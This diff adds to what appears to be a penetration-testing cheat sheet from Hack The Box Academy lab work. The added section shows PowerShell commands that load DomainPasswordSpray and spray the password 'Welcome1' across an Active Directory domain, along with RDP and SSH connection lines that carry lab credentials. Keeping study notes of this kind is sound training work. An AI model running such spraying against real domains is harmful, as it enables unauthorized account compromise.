@@ -80,3 +80,15 @@ adb shell ls -la /storage/emulated/0/Android/data/$pkg/cache
 adb shell ls -la /data/user/0/$pkg/code_cache
 adb shell ls -la /data/user/0/$pkg/cache 
 
+##### Internal Password Spraying - from Windows
+
+
+https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1
+
+PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
+PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
+
+
+xfreerdp3 /v:10.129.233.239 /u:htb-student /p:HTB_@AAcademy_stdnt_AD!
+
+ssh htb-student@10.129.233.238
